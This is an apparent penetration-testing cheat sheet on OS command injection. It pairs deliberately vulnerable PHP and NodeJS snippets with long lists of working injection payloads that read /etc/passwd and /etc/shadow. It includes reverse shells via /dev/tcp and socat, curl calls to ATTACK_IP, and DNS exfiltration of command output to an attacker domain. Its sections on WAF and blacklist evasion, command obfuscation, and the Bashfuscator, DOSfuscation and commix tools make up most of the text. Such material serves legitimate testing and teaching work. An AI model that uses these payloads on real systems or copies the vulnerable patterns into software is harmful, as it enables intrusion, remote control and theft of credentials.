# Command Injection

**PHP Example**

`exec`, `system`, `shell_exec`, `passthru`, or `popen` functions to execute commands

```
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

**NodeJS Example**

`child_process.exec` or `child_process.spawn`

```
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```

### Vulnerable Parameters <a href="#vulnerable-parameters" id="vulnerable-parameters"></a>

Top 25 parameters that could be vulnerable

```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```

### Detection <a href="#detection" id="detection"></a>

<figure><img src="/files/NXGn1V7wH3GLvF8jL8vG" alt=""><figcaption></figcaption></figure>

```
;
%3b
\n
%0a
&
%26
|
%7c
&&
%26%26
||
%7c%7c
``
%60%60
$()
%24%28%29
```

```
$(curl${IFS}http://ATTACK_IP)
```

### Confirm with time command <a href="#confirm-with-time-command" id="confirm-with-time-command"></a>

```
# 5 seconds sleep

$ time curl "http://target.com/script.php?id=;sleep%205"
```

### Basic Payloads <a href="#basic-payloads" id="basic-payloads"></a>

```
<!--#exec%20cmd="/bin/cat%20/etc/passwd"-->
<!--#exec%20cmd="/bin/cat%20/etc/shadow"-->
<!--#exec%20cmd="/usr/bin/id;-->
<!--#exec%20cmd="/usr/bin/id;-->
/index.html|id|
;id;
;id
;netstat -a;
;id;
|id
|/usr/bin/id
|id|
|/usr/bin/id|
||/usr/bin/id|
|id;
||/usr/bin/id;
;id|
;|/usr/bin/id|
\n/bin/ls -al\n
\n/usr/bin/id\n
\nid\n
\n/usr/bin/id;
\nid;
\n/usr/bin/id|
\nid|
;/usr/bin/id\n
;id\n
|usr/bin/id\n
|nid\n
`id`
`/usr/bin/id`
a);id
a;id
a);id;
a;id;
a);id|
a;id|
a)|id
a|id
a)|id;
a|id
|/bin/ls -al
a);/usr/bin/id
a;/usr/bin/id
a);/usr/bin/id;
a;/usr/bin/id;
a);/usr/bin/id|
a;/usr/bin/id|
a)|/usr/bin/id
a|/usr/bin/id
a)|/usr/bin/id;
a|/usr/bin/id
;system('cat%20/etc/passwd')
;system('id')
;system('/usr/bin/id')
%0Acat%20/etc/passwd
%0A/usr/bin/id
%0Aid
%0A/usr/bin/id%0A
%0Aid%0A
& ping -i 30 127.0.0.1 &
& ping -n 30 127.0.0.1 &
%0a ping -i 30 127.0.0.1 %0a
`ping 127.0.0.1`
| id
& id
; id
%0a id %0a
`id`
$;/usr/bin/id
whoami
wh$()oami
whoam$(echo+i)
who'a'm(echo+i)
;id
&& id
| id
$(id)
`id`
& whoami
| whoami
&& whoami
sleep 10
; sleep 10
&& sleep 10
ping -n 10 127.0.0.1 
```

### Bypassing Front-End Validation <a href="#bypassing-front-end-validation" id="bypassing-front-end-validation"></a>

Intercept and add input

<figure><img src="https://0xss0rz.gitbook.io/0xss0rz/~gitbook/image?url=https%3A%2F%2F4199783661-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MFF3hT6DtJlHn9jAel9%252Fuploads%252FhGuPvaqoJGq7MIKiXsFM%252Fimage.png%3Falt%3Dmedia%26token%3De62a2a86-9437-4ef5-864b-3e79e940a21d&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=4537f604&#x26;sv=2" alt=""><figcaption></figcaption></figure>

#### AND Operator <a href="#and-operator" id="and-operator"></a>

```
ping -c 1 127.0.0.1 && whoami
```

URL-encoding it - see [Detection](https://0xss0rz.gitbook.io/0xss0rz/pentest/web-attacks/command-injection#detection) Table or Use Burp

`%26%26`

<figure><img src="https://0xss0rz.gitbook.io/0xss0rz/~gitbook/image?url=https%3A%2F%2F4199783661-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MFF3hT6DtJlHn9jAel9%252Fuploads%252FugCe0Z5LqkEPCRS1nyNc%252Fimage.png%3Falt%3Dmedia%26token%3Da5ef73b0-b4f2-4c62-a25b-93078d7174ce&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=3a3f3e51&#x26;sv=2" alt=""><figcaption></figcaption></figure>

#### OR Operator <a href="#or-operator" id="or-operator"></a>

```
ping -c 1 || whoami
```

`%7c%7c` - see [Detection](https://0xss0rz.gitbook.io/0xss0rz/pentest/web-attacks/command-injection#detection) Table or Use Burp

Execution if the first command fail

<figure><img src="https://0xss0rz.gitbook.io/0xss0rz/~gitbook/image?url=https%3A%2F%2F4199783661-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MFF3hT6DtJlHn9jAel9%252Fuploads%252FrphnRXlwBsBILuZ4Ebpp%252Fimage.png%3Falt%3Dmedia%26token%3D9be5bec0-d4d9-472c-aed1-eb6f63d5efc7&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=ce4a32e2&#x26;sv=2" alt=""><figcaption></figcaption></figure>

### Operators <a href="#operators" id="operators"></a>

<figure><img src="/files/I5wE1SRL3YzXuDNNKWnw" alt=""><figcaption></figcaption></figure>

### Blind OS Command Injection <a href="#blind-os-command-injection" id="blind-os-command-injection"></a>

Detection

```
sleep 10
`sleep 10`
ping burpcollaborator
`ping burpcollaborator`
```

{% embed url="<https://medium.com/@ashkrypt/blind-os-command-injection-87910f0d2276>" %}

`ping $(whoami).collaborator_server_dot_com`

<figure><img src="https://0xss0rz.gitbook.io/0xss0rz/~gitbook/image?url=https%3A%2F%2F4199783661-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MFF3hT6DtJlHn9jAel9%252Fuploads%252FUexNIxvryCCwBwAKVnY1%252F1_ME9d1IA9ZXrgWFCZURGd1g.webp%3Falt%3Dmedia%26token%3Ded7d558c-5621-4ba7-8d8c-054120c41362&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=30a69f5d&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Reverse shell

```
`/bin/sh -i >& /dev/tcp/my_ip>/my_port 0>&1`
```

### Blind OS command injection - Redirect output <a href="#blind-os-command-injection-redirect-output" id="blind-os-command-injection-redirect-output"></a>

```
& whoami > /var/www/static/whoami.txt &
```

```
https://vulnerable.net/image?filename=whoami.txt
```

### Blind OS command injection - out of band OAST <a href="#blind-os-command-injection-out-of-band-oast" id="blind-os-command-injection-out-of-band-oast"></a>

Detection

```
& nslookup kgji2ohoyw.web-attacker.com &
```

Exfiltration

```
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

### WAF <a href="#waf" id="waf"></a>

*If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF.*

#### Blacklisted Characters <a href="#blacklisted-characters" id="blacklisted-characters"></a>

```
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

#### Identifying Blacklisted Character <a href="#identifying-blacklisted-character" id="identifying-blacklisted-character"></a>

One at a time: `127.0.0.1;` - Use URL encoding&#x20;

<figure><img src="https://0xss0rz.gitbook.io/0xss0rz/~gitbook/image?url=https%3A%2F%2F4199783661-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MFF3hT6DtJlHn9jAel9%252Fuploads%252FzxSnck8TFC1LDK6zW2YF%252Fimage.png%3Falt%3Dmedia%26token%3D5e27c839-6741-44d0-ac29-9fd53797eb6e&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=8f617a3f&#x26;sv=2" alt=""><figcaption></figcaption></figure>

### Bypassing Space Filters <a href="#bypassing-space-filters" id="bypassing-space-filters"></a>

#### Bypass Blacklisted Operators <a href="#bypass-blacklisted-operators" id="bypass-blacklisted-operators"></a>

The new-line character is usually not blacklisted, as it may be needed in the payload itself

#### Bypass Blacklisted Spaces <a href="#bypass-blacklisted-spaces" id="bypass-blacklisted-spaces"></a>

`127.0.0.1%0a whoami`

A space is a commonly blacklisted character, especially if the input should not contain any spaces

**Using Tabs**

Using tabs (%09) instead of spaces is a technique that may work

`127.0.0.1%0a%09`

**Using $IFS**

`127.0.0.1%0a${IFS}`

**Using Brace Expansion**

```
{ls,-la}

total 0
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 07:37 .
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 13:01 ..
```

`127.0.0.1%0a{ls,-la}`

<figure><img src="https://0xss0rz.gitbook.io/0xss0rz/~gitbook/image?url=https%3A%2F%2F4199783661-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MFF3hT6DtJlHn9jAel9%252Fuploads%252FgVcltj8ZFPEVWGbsTCoi%252Fimage.png%3Falt%3Dmedia%26token%3Dcf073b64-319e-4c11-a81e-f6fef4bbab3f&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=ca6030ad&#x26;sv=2" alt=""><figcaption></figcaption></figure>

More space filter bypass:

{% embed url="<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space>" %}

### Bypassing Other Blacklisted Characters <a href="#bypassing-other-blacklisted-characters" id="bypassing-other-blacklisted-characters"></a>

#### Linux <a href="#linux" id="linux"></a>

One technique we can use for replacing slashes (`or any other character`) is through `Linux Environment Variables`

```
echo ${PATH:0:1}

/
```

127.0.0.1; ls /home

```
ip=127.0.0.1%0a%09ls%09${PATH:0:1}home
```

RS Socat

```
127.0.0.1%0a%27s%27o%27c%27a%27t%27${IFS}TCP4:10.10.14.119:8000${IFS}EXEC:bash
```

semi-colon character

```
echo ${LS_COLORS:10:1}

;
```

semi-colon and a space

`127.0.0.1${LS_COLORS:10:1}${IFS}`

![](https://0xss0rz.gitbook.io/0xss0rz/~gitbook/image?url=https%3A%2F%2F4199783661-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MFF3hT6DtJlHn9jAel9%252Fuploads%252FX5lwDZnpPspzwCLU8CxO%252Fimage.png%3Falt%3Dmedia%26token%3D6fd17a5f-b9f3-4768-86d5-bacdac4512ec\&width=768\&dpr=4\&quality=100\&sign=2a19b6\&sv=2)

#### Windows <a href="#windows" id="windows"></a>

slash - cmd:

```
echo %HOMEPATH:~6,-11%

\
```

slash - powershell

```
PS C:\htb> $env:HOMEPATH[0]

\
```

#### Character Shifting <a href="#character-shifting" id="character-shifting"></a>

slash

```
echo $(tr '!-}' '"-~'<<<[)

\
```

semi-colon

```
echo $(tr '[' ';'<<<[)

;
```

### Bypassing Blacklisted Commands <a href="#bypassing-blacklisted-commands" id="bypassing-blacklisted-commands"></a>

#### Commands Blacklist <a href="#commands-blacklist" id="commands-blacklist"></a>

```
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

#### Linux & Windows <a href="#linux-and-windows" id="linux-and-windows"></a>

```
$ w'h'o'am'i

21y4d
```

```
$ w"h"o"am"i

21y4d
```

`127.0.0.1%0aw'h'o'am'i`

<a class="button secondary">Copy</a>

<figure><img src="https://0xss0rz.gitbook.io/0xss0rz/~gitbook/image?url=https%3A%2F%2F4199783661-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MFF3hT6DtJlHn9jAel9%252Fuploads%252FX0PHiRhqiRX90kazIyR3%252Fimage.png%3Falt%3Dmedia%26token%3D60737ca4-2759-47ed-aa6f-3d995810ab0b&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=651dfc41&#x26;sv=2" alt=""><figcaption></figcaption></figure>

```
127.0.0.1%0a%09ls%09${PATH:0:1}home${PATH:0:1}1nj3c70r
```

<figure><img src="https://0xss0rz.gitbook.io/0xss0rz/~gitbook/image?url=https%3A%2F%2F4199783661-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MFF3hT6DtJlHn9jAel9%252Fuploads%252F1yU17cRX3gpU4UB5o3z1%252Fimage.png%3Falt%3Dmedia%26token%3Df3751e12-42f3-4c8e-956b-31e2fcc182e1&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=cbbe34d3&#x26;sv=2" alt=""><figcaption></figcaption></figure>

cat - Invalid Input

<figure><img src="https://0xss0rz.gitbook.io/0xss0rz/~gitbook/image?url=https%3A%2F%2F4199783661-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MFF3hT6DtJlHn9jAel9%252Fuploads%252FxnExWrQhysE27iKaK4ga%252Fimage.png%3Falt%3Dmedia%26token%3Df5342da5-a683-4e2a-85f1-bf7a7aff1065&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=77e6e9d3&#x26;sv=2" alt=""><figcaption></figcaption></figure>

`127.0.0.1%0a%09c'a't%09${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt`

<figure><img src="https://0xss0rz.gitbook.io/0xss0rz/~gitbook/image?url=https%3A%2F%2F4199783661-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MFF3hT6DtJlHn9jAel9%252Fuploads%252FnxUHFD06xKFlRAQ9toRr%252Fimage.png%3Falt%3Dmedia%26token%3D39bb584c-55e6-4e0f-8018-00f6f0cb3514&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=38df1ce3&#x26;sv=2" alt=""><figcaption></figcaption></figure>

#### Linux Only <a href="#linux-only" id="linux-only"></a>

backslash `\` and the positional parameter character `$@` are ignored

```
who$@ami
w\ho\am\i
```

Try the above two examples in your payload, and see if they work in bypassing the command filter. If they do not, this may indicate that you may have used a filtered character. Would you be able to bypass that as well, using the techniques we learned in the previous section?

#### Windows Only <a href="#windows-only" id="windows-only"></a>

caret (`^`)

```
C:\htb> who^ami

21y4d
```

### Advanced Command Obfuscation <a href="#advanced-command-obfuscation" id="advanced-command-obfuscation"></a>

#### Case Manipulation <a href="#case-manipulation" id="case-manipulation"></a>

`WHOAMI` => `WhOaMi`

```
PS C:\htb> WhOaMi

21y4d
```

```
$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

21y4d
```

Replace space (blacklisted) with %09

<figure><img src="https://0xss0rz.gitbook.io/0xss0rz/~gitbook/image?url=https%3A%2F%2F4199783661-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MFF3hT6DtJlHn9jAel9%252Fuploads%252FohU6Sjkd6vgiDICVYnKp%252Fimage.png%3Falt%3Dmedia%26token%3D73075105-7e92-4a7b-9200-edbdd0c94647&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=7afdb496&#x26;sv=2" alt=""><figcaption></figcaption></figure>

```
$(a="WhOaMi";printf %s "${a,,}")
```

<figure><img src="https://0xss0rz.gitbook.io/0xss0rz/~gitbook/image?url=https%3A%2F%2F4199783661-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MFF3hT6DtJlHn9jAel9%252Fuploads%252Fs4ImNzZ9hQDjnp0Okurj%252Fimage.png%3Falt%3Dmedia%26token%3D1ee92b97-5e67-4f3e-a959-e63f7f3d1891&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=22c943fa&#x26;sv=2" alt=""><figcaption></figcaption></figure>

#### Reversed Commands <a href="#reversed-commands" id="reversed-commands"></a>

```
echo 'whoami' | rev
imaohw
```

```
$ $(rev<<<'imaohw')

21y4d
```

<figure><img src="https://0xss0rz.gitbook.io/0xss0rz/~gitbook/image?url=https%3A%2F%2F4199783661-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MFF3hT6DtJlHn9jAel9%252Fuploads%252FQfatuVCm5rtIUKZfH9Yf%252Fimage.png%3Falt%3Dmedia%26token%3D1a75001e-6554-43b2-bd6c-4252f30d90f4&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=28a45bde&#x26;sv=2" alt=""><figcaption></figcaption></figure>

If you wanted to bypass a character filter with the above method, you'd have to reverse them as well, or include them when reversing the original command.

```
PS C:\htb> "whoami"[-1..-20] -join ''

imaohw
```

```
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"

21y4d
```

#### Encoded Commands <a href="#encoded-commands" id="encoded-commands"></a>

```
echo -n 'cat /etc/passwd | grep 33' | base64

Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

```
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

Tip: Note that we are using `<<<` to avoid using a pipe `|`, which is a filtered character.

Replace space (blacklisted) with %09

<figure><img src="https://0xss0rz.gitbook.io/0xss0rz/~gitbook/image?url=https%3A%2F%2F4199783661-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MFF3hT6DtJlHn9jAel9%252Fuploads%252FxTh9uxJtHiLjreUyZJoe%252Fimage.png%3Falt%3Dmedia%26token%3D64333b59-6132-4516-b57c-47e6ff8318ff&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=be11a4b0&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Even if some commands were filtered, like `bash` or `base64`, we could bypass that filter with the techniques we discussed in the previous section (e.g., character insertion), or use other alternatives like `sh` for command execution and `openssl` for b64 decoding, or `xxd` for hex decoding.

```
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

dwBoAG8AYQBtAGkA
```

```
echo -n whoami | iconv -f utf-8 -t utf-16le | base64

dwBoAG8AYQBtAGkA
```

```
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

21y4d
```

More Technique

{% embed url="<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion>" %}

#### Obfuscated Commands <a href="#obfuscated-commands" id="obfuscated-commands"></a>

```
$(curl${IFS}http://ATTACK_IP)
```

List of commands obfuscated as wordlist to test possible WAF filter bypass:

```
uname
u'n'a'm'e
${uname}
$(uname)
{uname}
{ls,-la}
who$@ami
w\ho\am\i
$(rev<<<'emanu')
bash<<<$(base64 -d<<<dW5hbWUgLWE=)
b'a's'h'<<<$('b'a's'e'6'4 -d<<<dW5hbWUgLWE=)
l's'${IFS}${PATH:0:1}${IFS}-a'l'
```

List from payloadallthethings (with some change)

```
cat${IFS}/etc/passwd
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
c'a't${IFS}/etc/passwd
c'a't${IFS}${PATH:0:1}etc${PATH:0:1}passwd
c'a't${IFS}${PATH:0:1}e't'c${PATH:0:1}p'a's's'wd
ls${IFS}-la
l's${IFS}-l'a
{cat,/etc/passwd}
cat</etc/passwd
c'a't</e't'c/p'a's's'w'd
cat<${PATH:0:1}etc${PATH:0:1}passwd
c'a't<${PATH:0:1}e't'c${PATH:0:1}p'a's's'w'd
;ls%09-al%09/home
ls%09-al%09/home
l's%09-a'l%09/h'o'm'e
l's%09-a'l%09{PATH:0:1}h'o'm'e
cat%20/et%5C%0Ac/pa%5C%0Asswd
cat%20{PATH:0:1}et%5C%0Ac{PATH:0:1}pa%5C%0Asswd
cat${HOME:0:1}etc${HOME:0:1}passwd
c'a't${HOME:0:1}etc${HOME:0:1}passwd
w'h'o'am'i
wh''oami
w"h"o"am"i
wh""oami
wh``oami
w\ho\am\i
/\b\i\n/////s\h
who$@ami
who$()ami
who$(echo am)i
who`echo am`i
```

```
# normal (blocked)
whoami

# null statement (passes)
wh$()oami

# alternative null statement (passes)
whoam$(echo+i)

# alternative statement quotes (passed)
who'a'm(echo+i)
```

#### Fuzzing - Cluster bomb <a href="#fuzzing-cluster-bomb" id="fuzzing-cluster-bomb"></a>

![](https://0xss0rz.gitbook.io/0xss0rz/~gitbook/image?url=https%3A%2F%2F4199783661-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MFF3hT6DtJlHn9jAel9%252Fuploads%252FVhCtzvNElfw9fUzh3lGQ%252Fimage.png%3Falt%3Dmedia%26token%3D41b5b868-49fc-4bec-8364-eb33fe25d804\&width=768\&dpr=4\&quality=100\&sign=ed62ea1c\&sv=2)![](https://0xss0rz.gitbook.io/0xss0rz/~gitbook/image?url=https%3A%2F%2F4199783661-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MFF3hT6DtJlHn9jAel9%252Fuploads%252FGM37DdiWIBSI2KN15kgt%252Fimage.png%3Falt%3Dmedia%26token%3D68f8b7ec-55bc-4e5e-8e50-e80bab18a9ad\&width=768\&dpr=4\&quality=100\&sign=81d0515f\&sv=2)

1. List [Detection](https://app.gitbook.com/o/iUvKO7e7FG5n3fWAv5jl/s/LOEWCqpy5OCVJux6qFwa/~/edit/~/changes/142/pentesting/wep-pen/owsap-top-10/injection/comma-injection#detection)
2. List Obfuscated Commands

cluster bomb

<figure><img src="https://0xss0rz.gitbook.io/0xss0rz/~gitbook/image?url=https%3A%2F%2F4199783661-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MFF3hT6DtJlHn9jAel9%252Fuploads%252Frktrd4brvy7uCzqfkPQX%252Fimage.png%3Falt%3Dmedia%26token%3Dd2bdefbe-c85c-4797-9054-1ca1a65f8f39&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=8aaebd10&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Payload 1 - set to detection list

<figure><img src="https://0xss0rz.gitbook.io/0xss0rz/~gitbook/image?url=https%3A%2F%2F4199783661-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MFF3hT6DtJlHn9jAel9%252Fuploads%252FKjyCa3SxU9uvRMurAEzM%252Fimage.png%3Falt%3Dmedia%26token%3Db870cf9f-40c9-4115-ae3d-d755dce8df82&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=4e1aeb72&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Payload 2 - set to obfuscated command

<figure><img src="https://0xss0rz.gitbook.io/0xss0rz/~gitbook/image?url=https%3A%2F%2F4199783661-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MFF3hT6DtJlHn9jAel9%252Fuploads%252FJhzVT0RhB56YbXGLv6g2%252Fimage.png%3Falt%3Dmedia%26token%3D4c07b5e2-ac82-4b6f-b7a7-22c198153a4e&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=3e25bc6d&#x26;sv=2" alt=""><figcaption></figcaption></figure>

<figure><img src="https://0xss0rz.gitbook.io/0xss0rz/~gitbook/image?url=https%3A%2F%2F4199783661-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MFF3hT6DtJlHn9jAel9%252Fuploads%252Fa167NORO7qwMhNxAM4Kz%252Fimage.png%3Falt%3Dmedia%26token%3D10a40996-c458-4144-ac60-3995316e480b&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=df7e18d8&#x26;sv=2" alt=""><figcaption></figcaption></figure>

### Evasion Tools <a href="#evasion-tools" id="evasion-tools"></a>

#### Linux (Bashfuscator) <a href="#linux-bashfuscator" id="linux-bashfuscator"></a>

{% embed url="<https://github.com/Bashfuscator/Bashfuscator>" %}

```
$ git clone https://github.com/Bashfuscator/Bashfuscator
$ cd Bashfuscator
$ pip3 install setuptools==65
$ python3 setup.py install --user
```

```
$ cd ./bashfuscator/bin/
$ ./bashfuscator -h
```

```
$ ./bashfuscator -c 'cat /etc/passwd'

[+] Mutators used: Token/ForCode -> Command/Reverse
[+] Payload:
 ${*/+27\[X\(} ...SNIP...  ${*~}   
[+] Payload size: 1664 characters
```

```
$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

[+] Mutators used: Token/ForCode
[+] Payload:
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
[+] Payload size: 104 characters
```

```
$ bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'

root:x:0:0:root:/root:/bin/bash
...SNIP...
```

#### Windows (DOSfuscation) <a href="#windows-dosfuscation" id="windows-dosfuscation"></a>

{% embed url="<https://github.com/danielbohannon/Invoke-DOSfuscation>" %}

```
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
Invoke-DOSfuscation> help

HELP MENU :: Available options shown below:
[*]  Tutorial of how to use this tool             TUTORIAL
...SNIP...

Choose one of the below options:
[*] BINARY      Obfuscated binary syntax for cmd.exe & powershell.exe
[*] ENCODING    Environment variable encoding
[*] PAYLOAD     Obfuscated payload via DOSfuscation
```

```
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1

...SNIP...
Result:
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```

```
C:\htb> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt

test_flag
```

Tip: If we do not have access to a Windows VM, we can run the above code on a Linux VM through `pwsh`. Run `pwsh`, and then follow the exact same command from above.

### Payloads <a href="#payloads" id="payloads"></a>

{% embed url="<https://github.com/payloadbox/command-injection-payload-list>" %}

### Tools <a href="#tools" id="tools"></a>

{% embed url="<https://github.com/commixproject/commix>" %}

```
commix --url=”http://target.com/vuln.php?param=1"

# Some options
-r REQUESTFILE      Load HTTP request from a file.
--crawl=CRAWLDEPTH  Crawl the website starting from the target URL
                        (Default: 1)
--cookie=COOKIE     HTTP Cookie header
--os=OS             Force back-end operating system (e.g. 'Windows' or
                        'Unix').
```

### Interesting Books <a href="#interesting-books" id="interesting-books"></a>

[Interesting Books](https://0xss0rz.gitbook.io/0xss0rz/interesting-books)

**Disclaimer**: As an Amazon Associate, I earn from qualifying purchases. This helps support this GitBook project at no extra cost to you.

* [**The Web Application Hacker’s Handbook**](https://www.amazon.fr/dp/1118026470?tag=0xss0rz-21) The go-to manual for web app pentesters. Covers XSS, SQLi, logic flaws, and more
* [**Bug Bounty Bootcamp: The Guide to Finding and Reporting Web Vulnerabilities**](https://www.amazon.fr/dp/1718501544?tag=0xss0rz-21) Learn how to perform reconnaissance on a target, how to identify vulnerabilities, and how to exploit them
* [**Real-World Bug Hunting: A Field Guide to Web Hacking**](https://www.amazon.fr/dp/1593278616?tag=0xss0rz-21) Learn about the most common types of bugs like cross-site scripting, insecure direct object references, and server-side request forgery.
